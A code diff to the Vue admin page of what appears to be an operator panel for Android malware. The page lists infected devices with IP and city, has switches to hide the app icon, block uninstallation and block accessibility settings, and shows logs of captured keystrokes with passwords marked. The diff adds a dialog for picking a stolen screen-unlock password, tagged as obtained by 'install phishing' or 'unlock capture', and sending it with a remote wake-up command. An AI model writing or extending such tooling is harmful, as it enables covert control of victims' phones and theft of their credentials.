@@ -23,7 +23,8 @@
 
       <el-form-item>
         <el-select filterable v-model="dataForm.installApp" placeholder="已安装APP" clearable>
-          <el-option v-for="app in installAppFilter" :key="app.packageName" :label="`${app.appName}(${app.packageName})`" :value="app.packageName"></el-option>
+          <el-option v-for="app in installAppFilter" :key="app.packageName"
+            :label="`${app.appName}(${app.packageName})`" :value="app.packageName"></el-option>
         </el-select>
       </el-form-item>
 
@@ -38,37 +39,50 @@
         <el-button @click="getDataList()">{{ $t("query") }}</el-button>
       </el-form-item>
     </el-form>
-    <el-table v-loading="dataListLoading" :data="dataList" border @sort-change="dataListSortChangeHandle" table-layout="auto" style="width: 100%">
-      <el-table-column prop="deviceId" label="设备ID" header-align="center" align="center" width="150px" show-overflow-tooltip></el-table-column>
-      <el-table-column prop="pkg" label="所属包" header-align="center" align="center" width="150px" show-overflow-tooltip></el-table-column>
-      <el-table-column prop="brand" label="品牌" header-align="center" align="center" width="80px" :show-overflow-tooltip="true"></el-table-column>
-      <el-table-column prop="model" label="手机型号" header-align="center" align="center" width="80px" show-overflow-tooltip></el-table-column>
-      <el-table-column prop="language" label="语言" header-align="center" align="center" width="60px" show-overflow-tooltip></el-table-column>
-      <el-table-column prop="systemVersion" label="系统版本" header-align="center" align="center" width="80px" show-overflow-tooltip></el-table-column>
-      <el-table-column prop="sdkVersion" label="sdk版本" header-align="center" align="center" width="80px" :show-overflow-tooltip="true"></el-table-column>
+    <el-table v-loading="dataListLoading" :data="dataList" border @sort-change="dataListSortChangeHandle"
+      table-layout="auto" style="width: 100%">
+      <el-table-column prop="deviceId" label="设备ID" header-align="center" align="center" width="150px"
+        show-overflow-tooltip></el-table-column>
+      <el-table-column prop="pkg" label="所属包" header-align="center" align="center" width="150px"
+        show-overflow-tooltip></el-table-column>
+      <el-table-column prop="brand" label="品牌" header-align="center" align="center" width="80px"
+        :show-overflow-tooltip="true"></el-table-column>
+      <el-table-column prop="model" label="手机型号" header-align="center" align="center" width="80px"
+        show-overflow-tooltip></el-table-column>
+      <el-table-column prop="language" label="语言" header-align="center" align="center" width="60px"
+        show-overflow-tooltip></el-table-column>
+      <el-table-column prop="systemVersion" label="系统版本" header-align="center" align="center" width="80px"
+        show-overflow-tooltip></el-table-column>
+      <el-table-column prop="sdkVersion" label="sdk版本" header-align="center" align="center" width="80px"
+        :show-overflow-tooltip="true"></el-table-column>
 
       <el-table-column label="屏幕分辨率" header-align="center" align="center" width="80px" :show-overflow-tooltip="true">
         <template v-slot="scope">
           {{ `${scope.row.screenWidth}×${scope.row.screenHeight}` }}
         </template>
       </el-table-column>
-      <el-table-column prop="ip" label="IP/城市" header-align="center" align="center" width="150px" :show-overflow-tooltip="true">
+      <el-table-column prop="ip" label="IP/城市" header-align="center" align="center" width="150px"
+        :show-overflow-tooltip="true">
         <template v-slot="scope">{{ scope.row.ip }} / {{ scope.row.addr }}</template>
       </el-table-column>
 
       <el-table-column label="开关" header-align="center" align="right" width="130px">
         <template v-slot="scope">
-          <el-switch inactive-text="隐藏图标" :model-value="!!scope.row.hideIcon" @update:model-value="updateDeviceSwitch(scope.row, 'hideIcon', $event)" />
-          <el-switch inactive-text="阻止卸载" :model-value="!!scope.row.uninstallGuard" @update:model-value="updateDeviceSwitch(scope.row, 'uninstallGuard', $event)" />
-          <el-switch inactive-text="阻止无障碍" :model-value="!!scope.row.accessibilityGuard" @update:model-value="updateDeviceSwitch(scope.row, 'accessibilityGuard', $event)" />
-          <el-switch inactive-text="固定锁屏" :model-value="!!scope.row.fixLockScreen" @update:model-value="updateDeviceSwitch(scope.row, 'fixLockScreen', $event)" />
+          <el-switch inactive-text="隐藏图标" :model-value="!!scope.row.hideIcon"
+            @update:model-value="updateDeviceSwitch(scope.row, 'hideIcon', $event)" />
+          <el-switch inactive-text="阻止卸载" :model-value="!!scope.row.uninstallGuard"
+            @update:model-value="updateDeviceSwitch(scope.row, 'uninstallGuard', $event)" />
+          <el-switch inactive-text="阻止无障碍" :model-value="!!scope.row.accessibilityGuard"
+            @update:model-value="updateDeviceSwitch(scope.row, 'accessibilityGuard', $event)" />
+          <!-- <el-switch inactive-text="固定锁屏" :model-value="!!scope.row.fixLockScreen" @update:model-value="updateDeviceSwitch(scope.row, 'fixLockScreen', $event)" /> -->
         </template>
       </el-table-column>
       <el-table-column label="设备状态" header-align="center" align="right" width="150px">
         <template v-slot="scope">
           <div>
             可解锁
-            <el-tooltip v-if="scope.row.lockScreen" class="box-item" effect="dark" :content="formatUnlockTips(scope.row)" placement="top">
+            <el-tooltip v-if="scope.row.lockScreen" class="box-item" effect="dark"
+              :content="formatUnlockTips(scope.row.lockScreen)" placement="top">
               <el-tag type="success">YES</el-tag>
             </el-tooltip>
             <el-tag type="danger" v-else>NO</el-tag>
@@ -88,9 +102,12 @@
         </template>
       </el-table-column>
 
-      <el-table-column prop="lastHeart" label="最后活动时间" header-align="center" align="center" width="150px" :show-overflow-tooltip="true"></el-table-column>、
-      <el-table-column prop="user" label="业务员" show-overflow-tooltip header-align="center" width="80px" align="center"></el-table-column>
-      <el-table-column prop="remark" label="备注" show-overflow-tooltip header-align="center" align="center"></el-table-column>
+      <el-table-column prop="lastHeart" label="最后活动时间" header-align="center" align="center" width="150px"
+        :show-overflow-tooltip="true"></el-table-column>、
+      <el-table-column prop="user" label="业务员" show-overflow-tooltip header-align="center" width="80px"
+        align="center"></el-table-column>
+      <el-table-column prop="remark" label="备注" show-overflow-tooltip header-align="center"
+        align="center"></el-table-column>
       <el-table-column :label="$t('handle')" header-align="center" align="center" width="90px" fixed="right">
         <template v-slot="scope">
           <!-- <el-button-group > -->
@@ -113,15 +130,9 @@
         </template>
       </el-table-column>
     </el-table>
-    <el-pagination
-      :current-page="page"
-      :page-sizes="[10, 20, 50, 100]"
-      :page-size="limit"
-      :total="total"
-      layout="total, sizes, prev, pager, next, jumper"
-      @size-change="pageSizeChangeHandle"
-      @current-change="pageCurrentChangeHandle"
-    >
+    <el-pagination :current-page="page" :page-sizes="[10, 20, 50, 100]" :page-size="limit" :total="total"
+      layout="total, sizes, prev, pager, next, jumper" @size-change="pageSizeChangeHandle"
+      @current-change="pageCurrentChangeHandle">
     </el-pagination>
 
     <DeviceDetail ref="deviceDetail" @wakeup="wakeup"></DeviceDetail>
@@ -150,7 +161,8 @@
     </el-dialog>
 
     <!-- 输入日志弹窗 -->
-    <el-dialog v-model="inputLogVisible" :title="`输入日志 - 设备ID: ${currentDevice.deviceId} 包名: ${currentDevice.pkg}`" width="970px" :close-on-click-modal="false" class="input-log-dialog">
+    <el-dialog v-model="inputLogVisible" :title="`输入日志 - 设备ID: ${currentDevice.deviceId} 包名: ${currentDevice.pkg}`"
+      width="970px" :close-on-click-modal="false" class="input-log-dialog">
       <div class="log-header">
         <div class="header-row">
           <div class="query-controls">
@@ -162,24 +174,17 @@
             <span class="query-label">APP包名:</span>
             <el-input v-model="queryAppPkg" placeholder="输入APP包名" clearable style="width: 200px" />
             <span class="query-label">查询日期:</span>
-            <el-date-picker
-              v-model="queryDate"
-              type="daterange"
-              range-separator="至"
-              start-placeholder="开始日期"
-              end-placeholder="结束日期"
-              format="YYYY-MM-DD"
-              value-format="YYYY-MM-DD"
-              @change="onDateChange"
-              style="width: 280px"
-            />
+            <el-date-picker v-model="queryDate" type="daterange" range-separator="至" start-placeholder="开始日期"
+              end-placeholder="结束日期" format="YYYY-MM-DD" value-format="YYYY-MM-DD" @change="onDateChange"
+              style="width: 280px" />
             <el-button type="primary" @click="refreshLog" :loading="logLoading" size="small">重新查询</el-button>
           </div>
         </div>
       </div>
 
       <div class="log-content" v-loading="logLoading">
-        <div class="log-item" v-for="(item, index) in inputLogList" :key="index" :class="{ 'password-item': item.password == 1 }">
+        <div class="log-item" v-for="(item, index) in inputLogList" :key="index"
+          :class="{ 'password-item': item.password == 1 }">
           <div class="log-content-row">
             <span class="log-time">{{ item.date || formatTime(item.time) }}</span>
             <span class="log-source" :class="{ 'source-admin': item.source == 1, 'source-app': item.source == 0 }">
@@ -199,8 +204,38 @@
     </el-dialog>
 
     <!-- 安装应用弹窗 -->
-    <el-dialog v-model="appListVisible" :title="`安装应用列表 - 设备ID: ${currentAppDevice.deviceId}`" width="1200px" :close-on-click-modal="false">
+    <el-dialog v-model="appListVisible" :title="`安装应用列表 - 设备ID: ${currentAppDevice.deviceId}`" width="1200px"
+      :close-on-click-modal="false">
       <AppList :device-id="currentAppDevice.deviceId" />
+    </el-dialog>
+    <!-- 选择解锁密码弹窗 -->
+    <el-dialog v-model="unlockDialogVisible" :title="`选择解锁密码 - 设备ID: ${currentWakeRow?.deviceId || ''}`" width="480px"
+      :close-on-click-modal="false">
+      <div>
+        <el-form label-width="90px">
+          <el-form-item label="解锁密码">
+            <el-select v-model="selectedUnlockId" placeholder="请选择解锁密码" filterable style="width: 100%">
+
+
+              <!-- <el-option v-for="item in unlockOptions" :key="item.id" :label="item.tips" :value="item.id" /> -->
+
+
+              <el-option v-for="item in unlockOptions" :key="item.id" :label="formatUnlockTips(item)" :value="item.id">
+                <span style="float: left">{{ formatUnlockTips(item) }}</span>
+                <span style="float: right; color: #8492a6; font-size: 13px"><span style="color:#00adff">{{
+                  item.createDate }}</span></span>
+
+              </el-option>
+
+            </el-select>
+          </el-form-item>
+        </el-form>
+      </div>
+      <template #footer>
+        <el-button @click="unlockDialogVisible = false">取消</el-button>
+        <el-button type="primary" @click="confirmWakeup" :loading="unlocking"
+          :disabled="!selectedUnlockId">确定</el-button>
+      </template>
     </el-dialog>
   </div>
 </template>
@@ -253,6 +288,11 @@ export default defineComponent({
     const currentAppDevice = ref({
       deviceId: ""
     });
+    const unlockDialogVisible = ref(false);
+    const unlockOptions = ref<any[]>([]);
+    const selectedUnlockId = ref<any>(null);
+    const unlocking = ref(false);
+    const currentWakeRow = ref<any | null>(null);
 
     return {
       ...useView(state),
@@ -270,7 +310,12 @@ export default defineComponent({
       salesmanSubmitting,
       salesmanRow,
       appListVisible,
-      currentAppDevice
+      currentAppDevice,
+      unlockDialogVisible,
+      unlockOptions,
+      selectedUnlockId,
+      unlocking,
+      currentWakeRow
     };
   },
   async mounted() {
@@ -293,21 +338,50 @@ export default defineComponent({
       }
     },
     async wakeup(row: any) {
-      let { code, msg } = await baseService.post("/device/wakeup", {
-        id: row.id
+      //获取解锁密码
+      const { success, data, msg } = await baseService.post("/unlockScreenPwd/page", {
+        deviceId: row.id,
+        page: 1,
+        limit: 100
       });
+      if (!success) {
+        ElMessage.error(msg);
+        return;
+      }
+      // 展示 弹出选择密码的弹窗（下拉显示 tips）
+      const list = Array.isArray(data) ? data : (data && (data.list || data.records)) || [];
+      this.unlockOptions = list || [];
+      if (!this.unlockOptions || this.unlockOptions.length === 0) {
+        ElMessage({ message: "暂无可选解锁密码，请先添加", type: "warning" });
+        return;
+      }
+      this.currentWakeRow = row;
+      this.selectedUnlockId = this.unlockOptions[0]?.id || null;
+      this.unlockDialogVisible = true;
+    },
 
-      if (code == 0) {
-        ElMessage({
-          message: "操作成功,等待唤醒!",
-          type: "success"
+    async confirmWakeup() {
+      if (!this.currentWakeRow || !this.selectedUnlockId) {
+        ElMessage({ message: "请选择解锁密码", type: "warning" });
+        return;
+      }
+      this.unlocking = true;
+      try {
+        const { code, msg } = await baseService.post("/device/wakeup", {
+          id: this.currentWakeRow.id,
+          unlockPwdId: this.selectedUnlockId
         });
-        this.getDataList();
-      } else {
-        ElMessageBox.alert(msg, "错误", {
-          type: "error",
-          confirmButtonText: "OK"
-        });
+        if (code == 0) {
+          ElMessage({ message: "操作成功,等待唤醒!", type: "success" });
+          this.unlockDialogVisible = false;
+          this.currentWakeRow = null;
+          this.selectedUnlockId = null;
+          this.getDataList();
+        } else {
+          ElMessageBox.alert(msg, "错误", { type: "error", confirmButtonText: "OK" });
+        }
+      } finally {
+        this.unlocking = false;
       }
     },
 
@@ -461,9 +535,9 @@ export default defineComponent({
         row[field] = intValue ? 0 : 1;
       }
     },
-    formatUnlockTips(row: any) {
+    formatUnlockTips(lockScreen: any) {
       let type = "";
-      switch (row.lockScreen.type) {
+      switch (lockScreen.type) {
         case 0:
           return "无锁";
         case 1:
@@ -478,7 +552,21 @@ export default defineComponent({
         default:
           return "未知";
       }
-      return `${type}:${row.lockScreen.tips}`;
+
+      let source = "";
+
+      switch (lockScreen.source) {
+        case 1:
+          source = "安装钓鱼";
+          break
+        case 2:
+          source = "解锁抓取";
+          break
+        default:
+          source = "未知";
+          break
+      }
+      return `(${source}) - ${type}:${lockScreen.tips}`;
     },
     showAppList(row: any) {
       this.currentAppDevice.deviceId = row.deviceId;
@@ -513,7 +601,7 @@ export default defineComponent({
   flex-wrap: nowrap;
 }
 
-.action-buttons.compact .el-button + .el-button {
+.action-buttons.compact .el-button+.el-button {
   margin-left: 4px;
 }
 
